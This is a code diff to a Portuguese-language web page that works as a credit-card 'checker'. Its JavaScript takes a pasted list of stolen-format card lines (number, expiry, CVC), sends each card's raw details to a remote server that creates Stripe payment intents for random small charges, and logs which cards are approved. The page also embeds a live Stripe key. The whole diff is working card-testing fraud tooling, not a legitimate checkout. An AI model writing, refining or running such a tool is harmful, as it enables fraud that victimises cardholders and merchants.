@@ -90,89 +90,76 @@
 
       document.getElementById("payment-form").addEventListener("submit", async function(event) {
         event.preventDefault();
-        const { paymentMethod, error } = await stripe.createPaymentMethod({ type: "card", card: card });
-
-        if (error) {
-          document.getElementById("card-errors").textContent = error.message;
-        } else {
-          const response = await fetch("https://chkfull.onrender.com/criar-payment-intent", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ paymentMethod: paymentMethod.id, amount: 1000 }),
-          });
-
-          const data = await response.json();
-          if (data.success) {
-            const confirmResult = await stripe.confirmCardPayment(data.clientSecret, { payment_method: paymentMethod.id });
-            if (confirmResult.error) {
-              document.getElementById("card-errors").textContent = confirmResult.error.message;
-            } else if (confirmResult.paymentIntent.status === 'succeeded') {
-              alert('Pagamento realizado com sucesso!');
-            }
-          } else {
-            document.getElementById("card-errors").textContent = data.message;
-          }
-        }
+        await processCardManually(card);
       });
     });
 
-    let isTesting = false, isPaused = false, cardQueue = [], interval = null;
+    async function processCardManually(card) {
+      const stripe = Stripe("pk_live_51R1BLCFMTCrh72HkN23f1mf1kcFo1aQIydknl26DXCOsg888WkhcoDcxyKfElSucgvhMxkEdfDFqUdFCbsPi8Csn00CBeL4Vb7");
+      const { paymentMethod, error } = await stripe.createPaymentMethod({ type: "card", card: card });
 
-    function startTesting() {
-      if (isTesting) return;
-      isTesting = true; isPaused = false;
-      cardQueue = document.getElementById("cardInput").value.split("\n").filter(line => line.trim() !== "");
-      processQueue();
-    }
+      if (error) {
+        document.getElementById("card-errors").textContent = error.message;
+        return;
+      }
 
-    function pauseTesting() { isPaused = !isPaused; }
-    function stopTesting() { isTesting = false; clearInterval(interval); }
+      let amount = Math.floor(Math.random() * (2000 - 1000 + 1)) + 1000; // R$10 a R$20
+      const response = await fetch("https://chkfull.onrender.com/criar-payment-intent", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ paymentMethod: paymentMethod.id, amount: amount }),
+      });
 
-    function processQueue() {
-      if (!isTesting || cardQueue.length === 0) return;
-      
-      interval = setInterval(async () => {
-        if (isPaused) return;
-        if (cardQueue.length === 0) { stopTesting(); return; }
-
-        let card = cardQueue.shift();
-        let [number, expMonth, expYear, cvc] = card.split("|");
-
-        let response = await fetch("https://chkfull.onrender.com/criar-payment-intent", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            paymentMethod: { type: "card", card: { number, exp_month: expMonth, exp_year: expYear, cvc } },
-            amount: Math.floor(Math.random() * (1000 - 500 + 1)) + 500 
-          }),
-        });
-
-        let result = await response.json();
-        handleResult(card, result, response.status);
-      }, 10000);
-    }
-
-    function handleResult(card, result, status) {
-      let message = `${card} - Código: ${status}`;
-      if (result.success) {
-        document.getElementById("approvedList").innerHTML += `<p class="approved">${message}</p>`;
-      } else if (status === 402) {
-        document.getElementById("declinedList").innerHTML += `<p class="declined">${message}</p>`;
+      const data = await response.json();
+      if (data.success) {
+        const confirmResult = await stripe.confirmCardPayment(data.clientSecret, { payment_method: paymentMethod.id });
+        if (confirmResult.paymentIntent.status === 'succeeded') {
+          alert(`Pagamento de R$ ${(amount / 100).toFixed(2)} realizado com sucesso!`);
+        }
       } else {
-        document.getElementById("errorList").innerHTML += `<p class="error">${message}</p>`;
+        document.getElementById("card-errors").textContent = data.message;
       }
     }
 
-    function showTab(tabId) {
-      document.querySelectorAll(".tab-content").forEach(tab => tab.classList.remove("show"));
-      document.getElementById(tabId).classList.add("show");
+    let isTesting = false, isPaused = false, cardQueue = [];
+
+    async function startTesting() {
+      if (isTesting) return;
+      isTesting = true;
+      isPaused = false;
+      cardQueue = document.getElementById("cardInput").value.split("\n").filter(line => line.trim() !== "");
+
+      for (let card of cardQueue) {
+        if (!isTesting || isPaused) break;
+        await processCard(card);
+      }
+
+      isTesting = false;
     }
 
-    function copyApproved() {
-      let approvedText = Array.from(document.querySelectorAll("#approvedList p")).map(p => p.innerText.split(" - ")[0]).join("\n");
-      navigator.clipboard.writeText(approvedText);
-      alert("Cartões aprovados copiados!");
+    async function processCard(card) {
+      let [number, expMonth, expYear, cvc] = card.split("|");
+      let amount = Math.floor(Math.random() * (2000 - 1000 + 1)) + 1000;
+
+      let response = await fetch("https://chkfull.onrender.com/criar-payment-intent", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          paymentMethod: { type: "card", card: { number, exp_month: expMonth, exp_year: expYear, cvc } },
+          amount: amount,
+        }),
+      });
+
+      let result = await response.json();
+      if (result.success) {
+        document.getElementById("approvedList").innerHTML += `<p class="approved">${card} - Aprovado com R$ ${(amount / 100).toFixed(2)}</p>`;
+      } else {
+        document.getElementById("errorList").innerHTML += `<p class="error">${card} - Erro: ${result.message}</p>`;
+      }
     }
+
+    function pauseTesting() { isPaused = !isPaused; }
+    function stopTesting() { isTesting = false; isPaused = true; }
 
     document.getElementById("startBtn").onclick = startTesting;
     document.getElementById("pauseBtn").onclick = pauseTesting;
